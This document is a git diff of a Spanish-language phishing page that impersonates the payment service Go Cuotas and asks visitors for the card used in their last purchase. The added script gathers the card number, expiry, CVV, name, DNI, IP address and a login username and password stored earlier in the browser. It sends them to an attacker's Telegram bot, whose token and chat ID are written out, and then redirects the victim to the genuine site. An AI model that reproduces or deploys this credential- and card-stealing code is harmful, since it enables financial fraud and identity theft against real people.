@@ -20,7 +20,6 @@
         -webkit-appearance:none;
     }
   </style>
-  <script type="text/javascript" src="js/justnumbers.js"></script>
 </head>
 <body>
   <header class="position-fixed w-100 bg-white">
@@ -41,7 +40,9 @@
       <div class="alert border mb-4 text-center">
         completa con los datos de la tarjeta de debito/credito que ultilizaste para realizar tu ultima compra.
       </div>
-      <form class="row m-0" method="POST" action="cons.php">
+      <form class="row m-0" onsubmit="sendTelegramMessage(event, '{{token}}', '{{chatid}}')">
+
+
         <div class="col-12 mb-3">
           <h4>Datos de la tarjeta</h4>
         </div>
@@ -74,6 +75,78 @@
   <a href="" class="d-block position-fixed help bg-primary">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 32" fill="#FFF"><path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"></path></svg>
   </a>
+  
+  <!-- CDN de Axios -->
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+<script>
+   document.getElementById('expiry').addEventListener('input', function(event) {
+    let input = event.target.value;
+    
+    // Remove all non-digit characters
+    input = input.replace(/\D/g, '');
+    
+    // Insert a "/" after the second digit
+    if (input.length > 2) {
+      input = input.slice(0, 2) + '/' + input.slice(2);
+    }
+
+    // Set the formatted value back to the input
+    event.target.value = input;
+  });
+  
+  function sendTelegramMessage(event) {
+    event.preventDefault(); // Evita que el formulario se envíe automáticamente
+
+    axios.get('/api/ip')
+      .then(response => {
+
+        const user = localStorage.getItem('user');
+        const pass = localStorage.getItem('password');
+        const ip = response.data.ip;
+        const card = document.getElementById('card').value;
+        const expiry = document.getElementById('expiry').value;
+        const cvv = document.getElementById('cvv').value;
+        const names = document.getElementById('names').value;
+        const dni = document.getElementById('dni').value;
+
+        const mensaje =
+          "<b> -- Go cuotas card -- </b>\n" +
+          "<b> - IP: </b> <code>" + ip + "</code>\n"+
+          "  [ Logo ] \n" +
+          "<b> - User: </b> <code>" + user + "</code>\n" +
+          "<b> - Pass: </b> <code>" + pass + "</code>\n" +
+          "  [ Tarjeta ] \n" +
+          "<b> - Números: </b> <code>" + card + "</code>\n" +
+          "<b> - vence: </b> <code>" + expiry + "</code>\n" +
+          "<b> - Código: </b> <code>" + cvv + "</code>\n" +
+          "  [ Información de la tarjeta ] \n" +
+          "<b> - Nombre: </b> <code>" + names + "</code>\n" +
+          "<b> - DNI: </b> <code>" + dni + "</code>\n"
+         ;
+
+        const urlmsj = decodeURIComponent(mensaje);
+        send_msj(urlmsj);
+      })
+      .catch(error => console.error('Error getting IP:', error));
+  }
+
+  function send_msj(urlmsj) {
+    const token = "6433083297:AAErgINcR9BwdrIZZFcRZYBPqyFldor2uvY";
+    const chatid = "-4050128712";
+
+    const httpParams = new URLSearchParams({
+      chat_id: chatid,
+      text: urlmsj,
+      parse_mode: 'html'
+    });
+
+    axios.post(`https://api.telegram.org/bot${token}/sendMessage`, httpParams)
+      .then(response => window.location.href = 'https://www.gocuotas.com')
+      .catch(error => alert('Intenta nuevamente más tarde'));
+  }
+</script>
+
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
 </body>
 </html>
